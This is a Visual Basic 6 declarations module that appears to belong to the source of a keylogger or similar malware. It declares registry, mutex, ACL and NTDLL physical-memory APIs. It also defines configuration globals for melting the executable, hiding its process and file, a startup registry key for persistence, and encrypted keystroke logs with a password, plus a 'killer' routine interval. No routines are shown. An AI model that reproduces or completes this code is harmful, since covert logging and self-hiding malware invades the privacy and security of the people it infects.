Attribute VB_Name = "Declarations"
Public Declare Function RegCloseKey Lib "advapi32.dll" (ByVal HKey As Long) As Long
Public Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal HKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Public Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal HKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal HKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Public Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal HKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Public Declare Function RegFlushKey Lib "advapi32.dll" (ByVal HKey As Long) As Long
Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" _
() '(ByVal HKey As Long, ByVal lpValueName As String, ByVal lpReserved As _
Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal _
HKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal _
dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long
Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" _
() '(ByVal HKey As Long, ByVal lpValueName As String) As Long
Public Enum T_KeyClasses
HKEY_CLASSES_ROOT = &H80000000
HKEY_CURRENT_CONFIG = &H80000005
HKEY_CURRENT_USER = &H80000001
HKEY_LOCAL_MACHINE = &H80000002
HKEY_USERS = &H80000003
End Enum

Public Enum InTypes
ValNull = 0
valstring = 1
ValXString = 2
ValBinary = 3
ValDWord = 4
ValLink = 6
ValMultiString = 7
ValResList = 8
End Enum

Public Const READ_CONTROL = &H20000
Public Const SYNCHRONIZE = &H100000
Public Const STANDARD_RIGHTS_ALL = &H1F0000
Public Const STANDARD_RIGHTS_READ = READ_CONTROL
Public Const STANDARD_RIGHTS_WRITE = READ_CONTROL
Public Const KEY_QUERY_VALUE = &H1
Public Const KEY_SET_VALUE = &H2
Public Const KEY_CREATE_SUB_KEY = &H4
Public Const KEY_ENUMERATE_SUB_KEYS = &H8
Public Const KEY_NOTIFY = &H10
Public Const KEY_CREATE_LINK = &H20
Public Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or KEY_QUERY_VALUE Or _
KEY_SET_VALUE Or KEY_CREATE_SUB_KEY Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or _
KEY_CREATE_LINK) And (Not SYNCHRONIZE))
Public Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or _
KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))
Public Const KEY_EXECUTE = ((KEY_READ) And (Not SYNCHRONIZE))
Public Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE _
Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))

Public Declare Function CreateMutex Lib "kernel32" Alias "CreateMutexA" (ByVal lpMutexAttributes As Long, ByVal bInitialOwner As Long, ByVal lpName As String) As Long
Public Declare Function ReleaseMutex Lib "kernel32" (ByVal hMutex As Long) As Long
Public Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Const WAIT_OBJECT_0         As Long = &H0

Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function SetForegroundWindow Lib "user32" (ByVal hWnd As Long) As Long
Public Const SW_RESTORE = 9
Public Const UniqueString          As String = "StringForAvoidingMultipleInstance"
Public GMutex      As Long


Public Const STATUS_INFO_LENGTH_MISMATCH = &HC0000004
Public Const STATUS_ACCESS_DENIED = &HC0000022
Public Const STATUS_INVALID_HANDLE = &HC0000008
Public Const ERROR_SUCCESS = 0&
Public Const SECTION_MAP_WRITE = &H2
Public Const SECTION_MAP_READ = &H4
Public Const WRITE_DAC = &H40000
Public Const NO_INHERITANCE = 0
Public Const DACL_SECURITY_INFORMATION = &H4

Public Type IO_STATUS_BLOCK
    Status As Long
    Information As Long
End Type

Public Type UNICODE_STRING
    Length As Integer
    MaximumLength As Integer
    buffer As Long
End Type

Public Const OBJ_INHERIT = &H2
Public Const OBJ_PERMANENT = &H10
Public Const OBJ_EXCLUSIVE = &H20
Public Const OBJ_CASE_INSENSITIVE = &H40
Public Const OBJ_OPENIF = &H80
Public Const OBJ_OPENLINK = &H100
Public Const OBJ_KERNEL_HANDLE = &H200
Public Const OBJ_VALID_ATTRIBUTES = &H3F2

Public Type OBJECT_ATTRIBUTES
    Length As Long
    RootDirectory As Long
    ObjectName As Long
    Attributes As Long
    SecurityDeor As Long
    SecurityQualityOfService As Long
End Type

Public Type ACL
    AclRevision As Byte
    Sbz1 As Byte
    AclSize As Integer
    AceCount As Integer
    Sbz2 As Integer
End Type

Public Enum ACCESS_MODE
    NOT_USED_ACCESS
    GRANT_ACCESS
    SET_ACCESS
    DENY_ACCESS
    REVOKE_ACCESS
    SET_AUDIT_SUCCESS
    SET_AUDIT_FAILURE
End Enum

Public Enum MULTIPLE_TRUSTEE_OPERATION
    NO_MULTIPLE_TRUSTEE
    TRUSTEE_IS_IMPERSONATE
End Enum

Public Enum TRUSTEE_FORM
    TRUSTEE_IS_SID
    TRUSTEE_IS_NAME
End Enum

Public Enum TRUSTEE_TYPE
    TRUSTEE_IS_UNKNOWN
    TRUSTEE_IS_USER
    TRUSTEE_IS_GROUP
End Enum

Public Type TRUSTEE
    pMultipleTrustee            As Long
    MultipleTrusteeOperation    As MULTIPLE_TRUSTEE_OPERATION
    TrusteeForm                 As TRUSTEE_FORM
    TrusteeType                 As TRUSTEE_TYPE
    ptstrName                   As String
End Type

Public Type EXPLICIT_ACCESS
    grfAccessPermissions        As Long
    grfAccessMode               As ACCESS_MODE
    grfInheritance              As Long
    TRUSTEE                     As TRUSTEE
End Type

Public Type AceArray
    List() As EXPLICIT_ACCESS
End Type

Public Enum SE_OBJECT_TYPE
    SE_UNKNOWN_OBJECT_TYPE = 0
    SE_FILE_OBJECT
    SE_SERVICE
    SE_PRINTER
    SE_REGISTRY_KEY
    SE_LMSHARE
    SE_KERNEL_OBJECT
    SE_WINDOW_OBJECT
    SE_DS_OBJECT
    SE_DS_OBJECT_ALL
    SE_PROVIDER_DEFINED_OBJECT
    SE_WMIGUID_OBJECT
End Enum

Public Declare Function SetSecurityInfo Lib "advapi32.dll" (ByVal Handle As Long, ByVal ObjectType As SE_OBJECT_TYPE, ByVal SecurityInfo As Long, ppsidOwner As Long, ppsidGroup As Long, ppDacl As Any, ppSacl As Any) As Long
Public Declare Function GetSecurityInfo Lib "advapi32.dll" (ByVal Handle As Long, ByVal ObjectType As SE_OBJECT_TYPE, ByVal SecurityInfo As Long, ppsidOwner As Long, ppsidGroup As Long, ppDacl As Any, ppSacl As Any, ppSecurityDeor As Long) As Long

Public Declare Function SetEntriesInAcl Lib "advapi32.dll" Alias "SetEntriesInAclA" (ByVal cCountOfExplicitEntries As Long, pListOfExplicitEntries As EXPLICIT_ACCESS, ByVal OldAcl As Long, NewAcl As Long) As Long
Public Declare Sub BuildExplicitAccessWithName Lib "advapi32.dll" Alias "BuildExplicitAccessWithNameA" (pExplicitAccess As EXPLICIT_ACCESS, ByVal pTrusteeName As String, ByVal AccessPermissions As Long, ByVal AccessMode As ACCESS_MODE, ByVal Inheritance As Long)

Public Declare Sub RtlInitUnicodeString Lib "NTDLL.DLL" (DestinationString As UNICODE_STRING, ByVal SourceString As Long)
Public Declare Function ZwOpenSection Lib "NTDLL.DLL" (SectionHandle As Long, ByVal DesiredAccess As Long, ObjectAttributes As Any) As Long
Public Declare Function LocalFree Lib "kernel32" (ByVal hMem As Any) As Long
Public Declare Function MapViewOfFile Lib "kernel32" (ByVal hFileMappingObject As Long, ByVal dwDesiredAccess As Long, ByVal dwFileOffsetHigh As Long, ByVal dwFileOffsetLow As Long, ByVal dwNumberOfBytesToMap As Long) As Long
Public Declare Function UnmapViewOfFile Lib "kernel32" (lpBaseAddress As Any) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Public Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long

Public Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type

Public verinfo As OSVERSIONINFO

Public g_hNtDLL As Long
Public g_pMapPhysicalMemory As Long
Public g_hMPM As Long
Public aByte(3) As Byte

Public Filename As String
Public FilePath As String
Public StartupKey As String
Public LogInterval As Integer
Public Melt As String
Public HideProcess As String
Public HideFile As String
Public YesNoStartup As String
Public LogName As String
Public YesNoEncryptLog As String
Public LogPassword As String
Public YesNoKiller As String
Public KillerInterval As String
Public RSPO As String

